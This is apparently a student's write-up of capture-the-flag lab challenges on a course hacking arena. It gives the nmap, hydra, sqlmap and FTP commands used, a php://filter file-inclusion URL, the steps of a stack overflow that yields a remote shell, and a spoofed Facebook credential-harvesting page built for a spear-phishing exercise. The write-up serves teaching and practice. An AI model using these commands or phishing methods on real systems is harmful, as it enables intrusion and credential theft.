## mal

## Task

----------------------------------------------------------

**Points**: 120

**The Flag**: UiO-Hacking-Arena{C0ld_war_1s_0v4r}

**The Task**: Find the flag here: kenobi.hackingarena.com, port range: 3000-3500



**Solution**:


**Pictures**:


# Osint


# Technical information gathering


# Networking 

## Bluebox

<br>

 The answer is: bluebox-test-server.mit.edu (18.8.3.1)
 <br>
<b>Description:</b>
 
  
        nmap -sL 18.8.0.0/16 | grep blue

![""](./IIK/bluebox.png?raw=true)

<br>

----------------------------------------------
<br>

## Hackingarena ports
 
<br>

 The answer is: 62

 I used nmmapper.com to find all the subdomains since nmap is slow and unreliable.
 and then scanned the ports for each of them.

!["ffs"](./IIK/network2.png)

<br>

----------------------------------------------
<br>

## Service flag
<br>

!["ffs"](./IIK/network3.png)

<br>

------------------------------

<br>

# Services

## Minuteman

----------------------------------------------------------

**Points**: 120

**The Flag**: UiO-Hacking-Arena{C0ld_war_1s_0v4r}

**The Task**: Find the flag here: kenobi.hackingarena.com, port range: 3000-3500



**Solution**:

1. I scanned the ports with nmap, and found that port 3202 is open

        sudo nmap -sS kenobi.hackingarena.com -p 3000-3500

2. Then i connected to the service using netcat to see what service it is, and it showed me "Good day Mr. President!
It's Monday 7 November, 1983.
Welcome to Able Archer!
Enter the SILO 73C password".

        nc kenobi.hackingarena.com 3202

3. Then i googled the SILO 73C passoword.

        https://nakedsecurity.sophos.com/2013/12/11/for-nearly-20-years-the-launch-code-for-us-nuclear-missiles-was-00000000/


**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/f00120346986ace78ede73323506aaaf.png)](https://gyazo.com/f00120346986ace78ede73323506aaaf)

[![Image from Gyazo](https://i.gyazo.com/f5f73318ae95117d64fd0d9e0ab4469d.png)](https://gyazo.com/f5f73318ae95117d64fd0d9e0ab4469d)

[![Image from Gyazo](https://i.gyazo.com/935016a58816c7cba2ae86d550540548.png)](https://gyazo.com/935016a58816c7cba2ae86d550540548)


## Service 3

----------------------------------------------------------

**Points**: 120

**The Flag**: Hacking-Arena{St0p_spy1ng_0n_us_Mark}

**The Task**: There's a service on kenobi.hackingarena.com in the port range 4000-4500. Find the tricky flag :)


**Solution**:

1. I scanned the ports with nmap, and found that port 4400 is open.

        sudo nmap -sS kenobi.hackingarena.com -p 4000-4500

2. Then i connected to the service using netcat to see what service it is, and it showed me that it is vsFTP service.

        nc kenobi.hackingarena.com 4400

3. Then i logged in with user anonymous and random password, and found a file with error.log.

        ftp kenobi.hackingarena.com -P 4400

        anonymous
        random@
        dir
        get error.log

4. There was a list of users in that file that passed login, and there was 2 of them that was not anonymous.

5. Then i googled mark zuckerburg password and then i got info that he used dadada as a bad password.

        https://www.vanityfair.com/news/2016/06/mark-zuckerberg-terrible-password-revealed-in-hack

6. I tried loging in as MarkZuckerberg and dadada as password and it worked!

        ftp 158.39.48.133 -P 4400
        MarkZuckerberg
        dadada
        dir #To show the files
        get flag.txt  #To download the file 

**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/2989a58f724dc9dfb556b779ef91a17e.png)](https://gyazo.com/2989a58f724dc9dfb556b779ef91a17e)

[![Image from Gyazo](https://i.gyazo.com/ffdf090d26dbb8ffc9cdeb231d71ffc9.png)](https://gyazo.com/ffdf090d26dbb8ffc9cdeb231d71ffc9)

[![Image from Gyazo](https://i.gyazo.com/58e1d540be25a32c10acf5260c0a740d.png)](https://gyazo.com/58e1d540be25a32c10acf5260c0a740d)

[![Image from Gyazo](https://i.gyazo.com/c99aa16831f975a451426385881d0e98.png)](https://gyazo.com/c99aa16831f975a451426385881d0e98)

<br>

# Web hacking

## Norwegian girl name 

**Find the flag here: http://vader.hackingarena.com:809/**


--------------------------------------------------------------------------------

I tried different methods and tools like brutex, burp-suit, nmap etc.

and then tried hydra to brutforce into the website but the passwords i got didnt work.

So i made a girl name list and run hydra again. That gave me couple of names which i tried Until i got Camilla as password

![pic](./webhacking/Pictures/norwegiangirls.png)

![pic](./webhacking/Pictures/norwegiangirlsflag.png)


<br>


## Airport
----------------------------------------------------------

**The Flag**: UiO-Hacking-Arena{Advanced_P0ST_Exp0itat1on}

**Solution**:

 I Used --form to use POST method

        python sqlmap.py  -u http://chewbacca.hackingarena.com:808/index.php --form --dbs

        python sqlmap.py  -u http://chewbacca.hackingarena.com:808/index.php --form -D Airport --tables

        python sqlmap.py  -u http://chewbacca.hackingarena.com:808/index.php --form -D Airport -T Flagflag --dump



**Pictures**

![pic](./Pictures/webhacking/airport1_command.png)

![pic](./Pictures/webhacking/airport1.png)

![pic](./Pictures/webhacking/airport2_command.png)

![pic](./Pictures/webhacking/airport2.png)

![pic](./Pictures/webhacking/airport3_command.png)

![pic](./Pictures/webhacking/airport_flag.png)

<br>


## Beatles song catalogue 2

----------------------------------------------------------

**The Flag**: Hacking-Arena{Yellow_Flagmarine}

**Solution**:
* I found out that i can show files from the photo paramenter så i converted the index.php to base.64 and read the source code.

        http://yoda.hackingarena.com:802/photo/index.php?photo=php://filter/convert.base64-encode/resource=/var/www/site/index.php


* In the source there was a comment that was refering to include db_connect.php, and in the source code of db_connect i found a comment that was refering to queryanalyer. after many guessings i found it in /var/www/site/queryanalyzer/index.php. Så i went back and opened it in the main link.

        http://yoda.hackingarena.com:802/queryanalyzer/index.php

* I used the following sql commands

        SHOW DATABASES;
        SHOW TABLES;
        SELECT * FROM SuperSecretFlag;
        

Note: this task was hell!

**Pictures**

![pic](./Pictures/webhacking/beatles2_1.png)

![pic](./Pictures/webhacking/beatles2_2.png)

![pic](./Pictures/webhacking/beatles2_3.png)

![pic](./Pictures/webhacking/beatles2_flag.png)

<br>

## Beatles song catalogue 3

----------------------------------------------------------

**The Flag**: HCSC{composed_1nj4ct10n_4asy?}

**Solution**:
* I solved it with sqlmap.

        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form --dbs --level 4 --risk 3 --threads 10 --dbms=mysql
        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData --tables --level 3 --risk 3 --threads 10 --dbms=mysql
        sudo sqlmap -u http://kenobi.hackingarena.com:912/index.php --form -D BeatlesData -T SuperSecretFlag --dump --level 3 --risk 3 --threads 10 --dbms=mysql


**Pictures**

![pic](./Pictures/webhacking/beatles3_1.png)

![pic](./Pictures/webhacking/beatles3_2.png)

![pic](./Pictures/webhacking/beatles3_3.png)

![pic](./Pictures/webhacking/beatles3_4.png)

![pic](./Pictures/webhacking/beatles3_5.png)

![pic](./Pictures/webhacking/beatles3_6.png)


![pic](./Pictures/webhacking/beatles3_flag.png)



## Task

----------------------------------------------------------

**Points**: 120

**The Flag**: UiO-Hacking-Arena{C0ld_war_1s_0v4r}

**The Task**: Find the flag here: kenobi.hackingarena.com, port range: 3000-3500


# Pwn

## Feedback padding length

----------------------------------------------------------

**Points**: 50

**Padding length**: 120

**The Task**: What is the necessary length of the paddingfor exploitation of the attached binary?

**Solution**:

 1. First i examined what input is vulnerable, and found out that the comment can overflow the stack and crush the program.
 2. Then i started putting the input using pwn tools with the python expoit template.
 3. After experimenting with the values i could determine what is the length of the string that will overflow the stack, and that is the padding length.


**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/2f93a30fa293be4a3f78cb37382b74be.png)](https://gyazo.com/2f93a30fa293be4a3f78cb37382b74be)
[![Image from Gyazo](https://i.gyazo.com/bef3ad1dc80f24fb5c9534c61d55b057.png)](https://gyazo.com/bef3ad1dc80f24fb5c9534c61d55b057)



## Feedback

----------------------------------------------------------

**Points**: 100

**The Flag**: Hacking-Arena{H4lp_w1th_f1xing_it}

**The Task**: Exploit the binary and read the remote flag: nc kenobi.hackingarena.com 921

**Solution**:

1. First i used the padding length that i found on the previous task.
2. Then i found the esp jmp address, so the next instruction will be the esp register.

        gdb ./feedback
        start
        asmsearch 'jmp esp' #and copied the address of the jmp


3. Then i used the payload provided in the task while adding nopsledg 'x09' in the beginning of the payload, and after running the exploit i got the shell of my pc.
4. Afterwards i used the exploit on the remote service, i got the remote shell and printed the flag.


**Pictures**:
[![Image from Gyazo](https://i.gyazo.com/882a92e3a32ce7546d4c60bd17826ed4.png)](https://gyazo.com/882a92e3a32ce7546d4c60bd17826ed4)

[![Image from Gyazo](https://i.gyazo.com/6072433b4864f790bc493f800de1bc06.png)](https://gyazo.com/6072433b4864f790bc493f800de1bc06)

[![Image from Gyazo](https://i.gyazo.com/46eb3de6963f49a63ca6f05734bf11b5.png)](https://gyazo.com/46eb3de6963f49a63ca6f05734bf11b5)

# Social engineering

## Spear phishing email

----------------------------------------------------------

**Points**: 100

**The Flag**: Hacking-Arena{I'm_naive_ok_very_naive}

**The Task**: Send me a spare-phishing email (laszlo.t.erdodi@gmail.com)


**Solution**:

1. First i made a spoofed facebook site on a server, with a php code that will store the username and password.
2. The username and password that will be entered will be saved locally on the server machine.
3. Then i made a phishing email where i mimicked a facebook warning.
4. The day after i got the flag on my server.

**Pictures**:

[![Image from Gyazo](https://i.gyazo.com/83a3ce205fcd78b562a4f0d73f4633ca.png)](https://gyazo.com/83a3ce205fcd78b562a4f0d73f4633ca)

[![Image from Gyazo](https://i.gyazo.com/88309f23b53f9bbc9c9a901070f7c290.png)](https://gyazo.com/88309f23b53f9bbc9c9a901070f7c290)
